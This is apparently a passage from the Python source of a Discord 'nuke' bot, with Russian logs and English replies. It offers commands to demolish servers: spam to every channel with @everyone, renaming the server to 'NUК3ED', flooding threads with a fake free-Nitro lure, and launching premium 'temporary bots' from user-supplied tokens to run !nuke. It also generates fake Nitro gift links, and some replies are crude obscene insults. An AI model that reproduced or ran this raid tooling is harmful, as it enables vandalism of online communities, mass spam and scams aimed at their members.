            console.print(f"[warning]⏳ Rate limit при выполнении команды crssh, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            embed = discord.Embed(
                title='❌ Error!',
                description='API request limit reached. Try again later.',
                color=discord.Colour.from_rgb(0, 0, 0)
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title='❌ Error!',
                description=f'HTTP error while executing command: {e}',
                color=discord.Colour.from_rgb(0, 0, 0)
            )
            await ctx.send(embed=embed)
            console.print(f"[error]❌ Ошибка HTTP при выполнении команды crssh на сервере {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        embed = discord.Embed(
            title='❌ Error!',
            description=f'An error occurred while executing the command: {e}',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды crssh на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def config(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда config не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда config запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !config запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !config для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config.copy())

    embed = {
        "title": "> ⚙️ Setting up parameters",
        "description": f"**> Choose what you want to change\n```\n!config_info — View your configuration in the bot\n!nuke — Launch kr4@sha with default or custom settings.\n```\n\n> Parameters for configuration\n\n**",
        "color": 0x808080,
        "fields": [
            {"name": "> server_name", "value": "**```\nServer\n```**", "inline": True},
            {"name": "> channel_name", "value": "**```\nChannels\n```**", "inline": True},
            {"name": "> spam_message", "value": "**```\nSpam\n```**", "inline": True},
            {"name": "> role_name", "value": "**```\nRoles\n```**", "inline": True},
        ],
        "footer": {"text": "Нажми на кнопку, чтобы изменить!"}
    }
    embed = discord.Embed.from_dict(embed)

    buttons = [
        discord.ui.Button(label="Server name", custom_id="server_name", style=discord.ButtonStyle.grey),
        discord.ui.Button(label="Channel Names", custom_id="channel_name", style=discord.ButtonStyle.grey),
        discord.ui.Button(label="Spam message", custom_id="spam_message", style=discord.ButtonStyle.grey),
        discord.ui.Button(label="Name of roles", custom_id="role_name", style=discord.ButtonStyle.grey),
    ]
    view = discord.ui.View()
    for button in buttons:
        view.add_item(button)

    console.print(f"[info]🔍 Пропущена загрузка иконки для сообщения config[/]")
    message = await ctx.send(embed=embed, view=view)  
    config_authors = load_config_authors()
    config_authors[str(message.id)] = user_id
    save_config_authors(config_authors)
    console.print(f"[success]✅ Сохранено: message_id={message.id}, user_id={user_id}[/]")

class ConfigMenu(discord.ui.Modal, title="Настройка"):
    def __init__(self, custom_id):
        super().__init__()
        self.custom_id = custom_id
        self.add_item(discord.ui.TextInput(
            label=f"Enter a new value for {custom_id}",
            placeholder="Enter the path to the image file for icon_path" if custom_id == "icon_path" else None
        ))

    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        if user_id not in user_config:
            user_config[user_id] = default_config.copy()
        user_config[user_id][self.custom_id] = self.children[0].value
        save_config(user_config)
        await interaction.response.send_message(f"{self.custom_id.capitalize()} successfully changed!", ephemeral=True)
        console.print(f"[success]✅ Параметр {self.custom_id} изменен на '{self.children[0].value}' для пользователя {interaction.user.name} ({user_id})[/]")

class TokenControlView(discord.ui.View):
    def __init__(self, author_id):
        super().__init__(timeout=None)  
        self.author_id = author_id
        self.message = None

    def enable_controls(self):
        self.change_avatar_button.disabled = False
        self.change_username_button.disabled = False

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("You can't use this.", ephemeral=True)
            return False
        console.print(f"[action]🔍 Взаимодействие: Юзер={interaction.user.id}, Сообщение={interaction.message.id}, Кнопка={interaction.data.get('custom_id')}[/]")
        return True

    @discord.ui.button(label="Enter token", style=discord.ButtonStyle.green, custom_id="enter_token")
    async def enter_token_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TokenModal())

    @discord.ui.button(label="Change avatar", style=discord.ButtonStyle.secondary, disabled=True, custom_id="change_avatar")
    async def change_avatar_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        temp_bot = temporary_bots.get(self.author_id, {}).get('bot_instance')
        if not temp_bot or not temp_bot.is_ready():
            await interaction.response.send_message("The bot is not running or the session has expired.", ephemeral=True)
            return

        await interaction.response.send_message("Please submit an image file for the new avatar.", ephemeral=True)
        try:
            msg = await bot.wait_for(
                "message",
                check=lambda m: m.author.id == self.author_id and m.channel == interaction.channel and m.attachments,
                timeout=120.0
            )
            attachment = msg.attachments[0]
            if not attachment.content_type.startswith('image/'):
                await interaction.followup.send("This is not an image.", ephemeral=True)
                return

            image_bytes = await attachment.read()
            await temp_bot.user.edit(avatar=image_bytes)
            await interaction.followup.send("The avatar has been successfully changed.", ephemeral=True)
            
            embed = interaction.message.embeds[0]
            embed.set_thumbnail(url=temp_bot.user.avatar.url)
            if self.message:
                await self.message.edit(embed=embed, view=self)
            await msg.delete()
        except asyncio.TimeoutError:
            await interaction.followup.send("Time's up.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

    @discord.ui.button(label="Change nickname", style=discord.ButtonStyle.secondary, disabled=True, custom_id="change_username")
    async def change_username_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        temp_bot = temporary_bots.get(self.author_id, {}).get('bot_instance')
        if not temp_bot or not temp_bot.is_ready():
            await interaction.response.send_message("The bot is not running or the session has expired.", ephemeral=True)
            return
        await interaction.response.send_modal(UsernameModal())


class UsernameModal(discord.ui.Modal, title="Change username"):
    username_input = discord.ui.TextInput(label="New bot username")

    async def on_submit(self, interaction: discord.Interaction):
        new_name = self.username_input.value
        user_id = interaction.user.id
        temp_bot = temporary_bots.get(user_id, {}).get('bot_instance')
        if temp_bot and temp_bot.is_ready():
            try:
                await temp_bot.user.edit(username=new_name)
                await interaction.response.send_message(f"Bot username changed to `{new_name}`.", ephemeral=True)
                embed = interaction.message.embeds[0]
                embed.description = f"Bot **{temp_bot.user}** successfully launched.\nIt will run for 30 minutes."
                await interaction.message.edit(embed=embed)
            except Exception as e:
                await interaction.response.send_message(f"Failed to change name: {e}", ephemeral=True)
        else:
            await interaction.response.send_message("The bot is not running or the session has expired.", ephemeral=True)

class TokenModal(discord.ui.Modal, title="Entering a token"):
    token_input = discord.ui.TextInput(
        label="Your bot's token",
        style=discord.TextStyle.paragraph,
        placeholder="Paste your bot token here..."
    )

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token_input.value
        user_id = interaction.user.id
        view = temporary_bots[user_id]['view']
        view.enter_token_button.disabled = True
        temporary_bots[user_id]['message_id'] = interaction.message.id
        save_temp_bots()
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=view)
        task = asyncio.create_task(run_and_shutdown_temp_bot(user_id, token, interaction, interaction.message))
        temporary_bots[user_id]['task'] = task

        embed = discord.Embed(
            title="⏳ Launching the bot...",
            description="Attempting to login using the provided token. Please wait.",
            color=discord.Color.orange()
        )
        await interaction.message.edit(embed=embed, view=view)

    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
        embed = discord.Embed(
            title="⚙️ Managing a temporary bot",
            description=(
                "**> Use the buttons below to launch your bot.\n\n"
"1. **Click 'Enter Token'** to launch the bot.\n"
"2. After successful launch, you will be able to **change avatar and nickname (If the bot is unverified)**.\n\n"
"**After launching the bot, use the `!help` command in the main temporary bot to view the commands. ON THE SERVER WHERE THE MAIN BOT IS, THE TEMPORARY ONE WILL NOT WORK**\n\n"
"To demolish the server, use `!nuke`**\n\n"
"**> Limits:**\n"
"- 1 bot per user at a time.\n"
"- The session lasts 30 minutes, after which the bot automatically disconnects."
            ),
            color=0x808080
        )
        view = temporary_bots[interaction.user.id]['view']
        await interaction.response.edit_message(embed=embed, view=view)

@bot.command()
@commands.cooldown(1, 1, commands.BucketType.user)
async def token(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда config_info не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда config_info запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !config_info запрещён[/]")
        return

    if ctx.author.id in temporary_bots:
        await ctx.send("You already have one temporary bot running. Wait until it is turned off (30 minutes).")
        return

    view = TokenControlView(ctx.author.id)
    
    embed = discord.Embed(
        title="> ⚙️ Managing a temporary bot",
        description=(
            "**> Use the buttons below to launch your bot.\n\n"
"1. **Click 'Enter Token'** to launch the bot.\n"
"2. After successful launch, you will be able to **change avatar and nickname (If the bot is unverified)**.\n\n"
"**After launching the bot, use the `!help` command in the main temporary bot to view the commands. ON THE SERVER WHERE THERE IS A MAIN BOT, THE TEMPORARY ONE WILL NOT WORK**\n\n"
"To demolish the server, use `!nuke`**\n\n"
"**> Limits:**\n"
"- 1 bot per user at a time.\n"
"- The session lasts 30 minutes, after which the bot automatically disconnects."
        ),
        color=0x808080
    )
    
    message = await ctx.send(embed=embed, view=view)
    view.message = message
    temporary_bots[ctx.author.id] = {'view': view, 'message_id': message.id}
    save_temp_bots()

    timed_out = await view.wait()
    if timed_out and ctx.author.id in temporary_bots and 'task' not in temporary_bots[ctx.author.id]:
        del temporary_bots[ctx.author.id]
        save_temp_bots()
        embed.title = "⌛ Session expired"
        embed.description = "You have not entered a token within 30 minutes."
        embed.color = discord.Color.dark_grey()
        try:
            await message.edit(embed=embed, view=None)
        except discord.NotFound:
            pass      

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type != discord.InteractionType.component:
        return

    user_id = str(interaction.user.id)
    message_id = str(interaction.message.id)
    custom_id = interaction.data.get('custom_id')

    logger.info(f"[action]🔍 Взаимодействие: Юзер={user_id}, Сообщение={message_id}, Кнопка={custom_id}[/]")

    if not custom_id:
        await interaction.response.send_message("❌ Ошибка: нет custom_id.", ephemeral=True)
        return

    try:
        config_authors = load_config_authors()
        logger.info(f"[info]🔍 config_authors: {config_authors}[/]")
    except Exception as e:
        logger.error(f"[error]❌ Ошибка загрузки config_authors: {e}[/]")
        await interaction.response.send_message("❌ Ошибка конфига.", ephemeral=True)
        return

    if custom_id in ['es', 'eng']:
        try:
            await interaction.response.send_message(
                "Has seleccionado español. Ahora puedes usar comandos en español." if custom_id == 'es' else
                "You have selected English. Now you can use commands in English.",
                ephemeral=True
            )
            await show_categories(interaction, custom_id)
            await asyncio.sleep(120)
            try:
                await interaction.delete_original_response()
            except discord.errors.NotFound:
                logger.info(f"Исходное сообщение уже удалено или не найдено для выбора '{custom_id}'.")
            except Exception as e:
                logger.error(f"Ошибка при удалении сообщения: {e}")
        except discord.errors.NotFound:
            logger.warning("Взаимодействие не найдено или срок действия истек.")
        return

    if message_id in config_authors and config_authors[message_id] != user_id:
        logger.error(f"[error]❌ Юзер {user_id} не тот, ожидался {config_authors[message_id]}[/]")
        await interaction.response.send_message(
            "You haven't called the `!config` command, so you can't use the buttons.", 
            ephemeral=True
        )
        return

    if custom_id in ["server_name", "channel_name", "spam_message", "role_name", "icon_path"]:
        modal = ConfigMenu(custom_id=custom_id)
        await interaction.response.send_modal(modal)
    elif custom_id == "reset_config":
        logger.info(f"[info]🔍 Сброс конфигурации для пользователя {interaction.user.name} ({user_id})[/]")
        try:
            await interaction.response.send_message("The config has been reset!", ephemeral=True)
        except discord.errors.HTTPException as e:
            logger.error(f"[error]❌ Ошибка при сбросе конфигурации: {e}[/]")
    elif custom_id == "category_select":
        logger.info(f"[info]🔍 Обработка выбора категории для пользователя {interaction.user.name} ({user_id})[/]")
    elif custom_id in ["change_avatar", "change_username"]:  
        if user_id in temporary_bots and 'view' in temporary_bots[user_id]:
            view = temporary_bots[user_id]['view']
            if custom_id == "change_avatar":
                await view.change_avatar_button.callback(interaction)
            elif custom_id == "change_username":
                await view.change_username_button.callback(interaction)

class ConfigInfoView(discord.ui.View):
    def __init__(self, author_id: int, message_id: int):
        super().__init__(timeout=None)
        self.author_id = author_id
        self.message_id = message_id

    @discord.ui.button(label="Reset config", style=discord.ButtonStyle.red, custom_id="reset_config")
    async def reset_config(self, interaction: discord.Interaction, button: discord.ui.Button):
        config_authors = load_config_authors()
        if str(interaction.message.id) not in config_authors or config_authors[str(interaction.message.id)] != str(interaction.user.id):
            if not interaction.response.is_done():
                await interaction.response.send_message(
                    "You did not call the ``!config_info`` command, so you cannot reset the configuration.",
                    ephemeral=True
                )
            console.print(f"[error]❌ Юзер {interaction.user.id} не является автором сообщения {interaction.message.id}[/]")
            return

        user_id = str(interaction.user.id)
        user_config[user_id] = default_config.copy()
        save_config(user_config)
        config = user_config[user_id]

        config = {k: v for k, v in config.items() if k != "template_description"}

        embed = {
            "title": "> ⚙️ Config reset",
            "description": f"**> Click on the buttons there\n```\n!config — Custom kr@sha setup\n!nuke — Launch kr4@sha with default or custom settings.\n```\n\n> Default settings\n\n**",
            "color": 0x808080,
            "fields": [
                {
                    "name": f"> {key}",
                    "value": f"**```\n{value}\n```**",
                    "inline": False
                }
                for key, value in config.items()
            ],
            "footer": {"text": "Everything has been reset, press again!"}
        }
        embed = discord.Embed.from_dict(embed)

        file = None
        try:
            with open(config.get("icon_path", default_config["icon_path"]), "rb") as f:
                file = discord.File(f, "icon.png")
            console.print(f"[success]✅ Загружен файл иконки {config.get('icon_path', default_config['icon_path'])}[/]")
        except FileNotFoundError:
            console.print(f"[warning]⚠️ Файл {config.get('icon_path', default_config['icon_path'])} не найден, отправляем без иконки[/]")

        await interaction.response.edit_message(embed=embed, view=self, attachments=[file] if file else [])
        console.print(f"[success]✅ Конфигурация сброшена и сообщение обновлено для пользователя {interaction.user.name} ({user_id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def config_info(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда config_info не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда config_info запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !config_info запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !config_info для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config.copy())

    config = {k: v for k, v in config.items() if k != "template_description"}

    embed = {
        "title": "> ⚙️ Config",
        "description": f"**> Click on the buttons there\n```\n!config — Custom kr@sha setup \n!nuke — Launch kr4@sha with default or custom settings. \n\n```> Your current settings\n\n**",
        "color": 0x808080,
        "fields": [
            {
                "name": f"> {key}",
                "value": f"**```\n{value}\n```**",
                "inline": False
            }
            for key, value in config.items()
        ],
        "footer": {"text": "Click !config to change"}
    }
    embed = discord.Embed.from_dict(embed)

    file = None
    icon_path = config.get("icon_path", default_config["icon_path"])
    
    if icon_path.startswith("http"):  
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_path) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    file = discord.File(data, filename="icon.png")
                    console.print(f"[success]✅ Загружено изображение по URL {icon_path}[/]")
                else:
                    console.print(f"[warning]⚠️ Не удалось загрузить изображение по URL {icon_path}, статус: {resp.status}[/]")
    else:  
        try:
            with open(icon_path, "rb") as f:
                file = discord.File(f, "icon.png")
            console.print(f"[success]✅ Загружен файл иконки {icon_path}[/]")
        except FileNotFoundError:
            console.print(f"[warning]⚠️ Файл {icon_path} не найден, отправляем без иконки[/]")

    message = await ctx.send(embed=embed, view=ConfigInfoView(ctx.author.id, 0), file=file)
    config_authors = load_config_authors()
    config_authors[str(message.id)] = user_id
    save_config_authors(config_authors)
    console.print(f"[success]✅ Сохранено: message_id={message.id}, user_id={user_id}[/]")
    
@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def spam(ctx: commands.Context):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда spam не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда spam запрещена! 😿[/]")
        return
    
    if ctx.guild.id in excluded_server_id:
        await ctx.send("анус себе порви спамом")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_id, команда spam запрещена[/]")
        return
    
    if len(ctx.guild.text_channels) > 40 and ctx.author.id not in premium_users:
        embed = discord.Embed(
            description="You do not have a premium subscription to launch spam in more than 40 channels in !custom_spam you can do more!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум, спам в >40 каналов запрещён[/]")
        return
    
    guild = ctx.guild
    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config)
    
    console.print("[action]📨 Запуск команды spam, рассылаем сообщения...[/]")
    await send_spam_messages(guild, config, fast_mode=True)
    
    await ctx.send(f"Spam sent!")
    console.print(f"[success]🎉 Спам успешно отправлен на сервере {guild.name} ({guild.id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def custom_spam(ctx: commands.Context, count: int, *, context: str):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда custom_spam не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда custom_spam запрещена! 😿[/]")
        return
    
    if ctx.guild.id in excluded_server_ids:
        await ctx.send("хоть ты и премиум мой подсос но посаси мне хуй тебе а не спам")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_ids, команда custom_spam запрещена[/]")
        return
    
    if ctx.author.id not in premium_users:
        embed = discord.Embed(
            description=":x: This command is only available to premium users.",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум, доступ к custom_spam запрещён[/]")
        return

    if count < 1 or count > 30:
        embed = discord.Embed(
            description=":warning: Please enter the amount of spam in the range from 1 to 30.",
            color=0xffa500
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Неверное количество сообщений ({count}), должно быть от 1 до 30[/]")
        return

    guild = ctx.guild
    spam_channels = [
        channel for channel in guild.text_channels
        if channel.type == discord.ChannelType.text
    ]

    console.print(f"[action]📨 Запуск команды custom_spam, рассылаем {count} сообщений с текстом '{context}'...[/]")
    spam_tasks = [send_spam_messages_to_channel(channel, count, context, fast_mode=True) for channel in spam_channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    
    await ctx.send(f"Custom spam sent!")
    console.print(f"[success]🎉 Кастомный спам успешно отправлен на сервере {guild.name} ({guild.id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def gen(ctx, amount: int):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда gen не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда admin запрещена! 😿[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !gen запрещён[/]")
        return

    if amount > 50 or amount < 1:
        await ctx.send("**Enter a value between 1 and 50**")
        console.print(f"[error]❌ Неверное количество кодов ({amount}) для !gen от {ctx.author.name} ({ctx.author.id})[/]")
        return

    console.print(f"[action]📨 Запуск команды !gen для {ctx.author.name} ({ctx.author.id}) с количеством={amount}[/]")
    
    try:
        wait_message = await ctx.send("Please wait...")
        codes = [f"https://discord.gift/{''.join(random.choices(string.ascii_uppercase + string.digits, k=16))}" for _ in range(amount)]
        nitro_codes = "\n".join(codes)
        nitro_file = discord.File(io.StringIO(nitro_codes), filename="nitro.txt")
        
        await ctx.send(file=nitro_file)
        await wait_message.edit(content=f"All {amount} nitro codes have been successfully generated and sent.")
        console.print(f"[success]✅ {amount} nitro-кодов сгенерированы и отправлены для {ctx.author.name} ({ctx.author.id})[/]")
    
    except discord.Forbidden:
        await wait_message.edit(content="Error: No permission to send file.")
        console.print(f"[error]❌ Нет прав для отправки файла nitro.txt для {ctx.author.name} ({ctx.author.id})[/]")
    except discord.HTTPException as e:
        await wait_message.edit(content=f"Error sending file!")
        console.print(f"[error]❌ HTTP ошибка при отправке nitro.txt для {ctx.author.name} ({ctx.author.id}): {e}[/]")
    except Exception as e:
        await wait_message.edit(content="Unknown error while generating codes.")
        console.print(f"[error]❌ Неизвестная ошибка в !gen для {ctx.author.name} ({ctx.author.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def rename_server(ctx):
    guild = ctx.guild
    serverName = "__...<<NUК3ED>>...__"
    
    if guild.id in server_blacklist:
        await ctx.send("Команда rename_server не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда rename_server запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Поменяй себе имя и покажи свои паспортные данные, валид, тогда сможешь на этом сервере использовать эту команду")
        console.print(f"[info]🔍 Команда rename_server запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return
    console.print(f"[action]🔧 Запуск команды !rename_server для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        async with limiter:
            await guild.edit(name=serverName)
        await ctx.send(f"The server has been successfully renamed!")
        console.print(f"[success]✅ Сервер {guild.name} ({guild.id}) переименован в {serverName}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have sufficient rights to rename the server.")
        console.print(f"[error]❌ Недостаточно прав для переименования сервера {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
            console.print(f"[warning]⏳ Rate limit при редактировании сервера, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
            async with limiter:
                await guild.edit(name=serverName)
            await ctx.send(f"Server successfully renamed to {serverName} after retry!")
            console.print(f"[success]✅ Сервер {guild.name} ({guild.id}) переименован после повторной попытки[/]")
        else:
            await ctx.send(f"Error renaming server!")
            console.print(f"[error]❌ HTTP ошибка при переименовании сервера {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        await ctx.send("An error occurred while renaming the server.")
        console.print(f"[error]❌ Неизвестная ошибка при переименовании сервера {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def custom_rename_server(ctx, *, new_name: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_rename_server не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_rename_server запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Премиум, говоришь? Хуй тебе!")
        console.print(f"[info]🔍 Команда custom_rename_server запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_rename_server запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !custom_rename_server для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id}) с новым именем '{new_name}'[/]")

    try:
        if not (2 <= len(new_name) <= 100):
            await ctx.send("The server name must be between 2 and 100 characters.")
            console.print(f"[error]❌ Неверная длина имени сервера ({len(new_name)}) для !custom_rename_server от {ctx.author.name} ({ctx.author.id})[/]")
            return

        user_id = str(ctx.author.id)
        config = user_config.get(user_id, default_config) if ctx.author.id in premium_users else default_config

        icon_data = None
        if config.get("icon_url"):
            icon_data = await download_icon(config["icon_url"])
            if icon_data:
                console.print(f"[success]✅ Иконка загружена по URL: {config['icon_url']}[/]")
            else:
                console.print(f"[warning]⚠️ Не удалось загрузить иконку по URL: {config['icon_url']}, пробуем локальный файл[/]")

        if not icon_data and config.get("icon_path"):
            try:
                with open(config["icon_path"], "rb") as f:
                    icon_data = f.read()
                console.print(f"[success]✅ Иконка загружена из файла: {config['icon_path']}[/]")
            except FileNotFoundError:
                console.print(f"[warning]⚠️ Файл {config['icon_path']} не найден, пропускаем изменение иконки[/]")
            except Exception as e:
                console.print(f"[error]❌ Ошибка при загрузке локальной иконки: {e}[/]")

        async with limiter:
            await guild.edit(name=new_name)
        await ctx.send(f"The server has been successfully renamed to {new_name}!")
        console.print(f"[success]✅ Сервер {guild.name} ({guild.id}) переименован в {new_name} и иконка обновлена[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have sufficient rights to rename the server.")
        console.print(f"[error]❌ Недостаточно прав для переименования сервера {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
            console.print(f"[warning]⏳ Rate limit при редактировании сервера, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
            async with limiter:
                await guild.edit(name=new_name, icon=icon_data)
            await ctx.send(f"Server successfully renamed to {new_name} after retry!")
            console.print(f"[success]✅ Сервер {guild.name} ({guild.id}) переименован после повторной попытки[/]")
        else:
            await ctx.send(f"Error renaming server!")
            console.print(f"[error]❌ HTTP ошибка при переименовании сервера {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        await ctx.send("An error occurred while renaming the server.")
        console.print(f"[error]❌ Неизвестная ошибка при переименовании сервера {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def create_threads(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда create_threads не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда create_threads запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Ахуел, минет делай мне")
        console.print(f"[info]🔍 Команда create_threads запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    channel = ctx.channel
    if not channel.permissions_for(guild.me).create_public_threads:
        await ctx.send(f"No permissions to create branches in the channel {channel.name}.")
        console.print(f"[warning]⚠️ Пропущен канал {channel.name} (ID: {channel.id}) - нет прав на создание веток[/]")
        return

    thread_name = "nuke3d-bitch"
    spam_message = "@everyone # The one who enters the server first will receive Nitro Full Year ----> https://discord.gg/pon / https://www.youtube.com/@GHSV5"
    
    console.print(f"[action]🔧 Запуск команды !create_threads для {ctx.author.name} ({ctx.author.id}) в канале {channel.name} (ID: {channel.id})[/]")
    
    created, failed = await create_threads_in_channel(channel, thread_name, 10, spam_message)
    
    await ctx.send(f"Created {created} branches! Failed to create {failed} branches.")
    console.print(f"[success]✅ Создано {created} веток с названием '{thread_name}' в канале {channel.name} (ID: {channel.id})! Не удалось создать {failed} веток[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def custom_create_threads(ctx, thread_name: str, *, spam_message: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_create_threads не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_create_threads запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Ахаххаха, веточки у своего дерева поотрывай, ел!")
        console.print(f"[info]🔍 Команда custom_create_threads запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_create_threads запрещён[/]")
        return

    channel = ctx.channel
    if not channel.permissions_for(guild.me).create_public_threads:
        await ctx.send(f"No permissions to create branches in the channel {channel.name}.")
        console.print(f"[warning]⚠️ Пропущен канал {channel.name} (ID: {channel.id}) - нет прав на создание веток[/]")
        return
    
    console.print(f"[action]🔧 Запуск команды !custom_create_threads для {ctx.author.name} ({ctx.author.id}) в канале {channel.name} (ID: {channel.id}) с именем ветки '{thread_name}'[/]")
    
    created, failed = await create_threads_in_channel(channel, thread_name, 10, spam_message)
    
    await ctx.send(f"Created {created} threads with name '{thread_name}'! Failed to create {failed} threads.")
    console.print(f"[success]✅ Создано {created} веток с названием '{thread_name}' в канале {channel.name} (ID: {channel.id})! Не удалось создать {failed} веток[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def rename_roles(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда rename_roles не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда rename_roles запрещена[/]")
        return

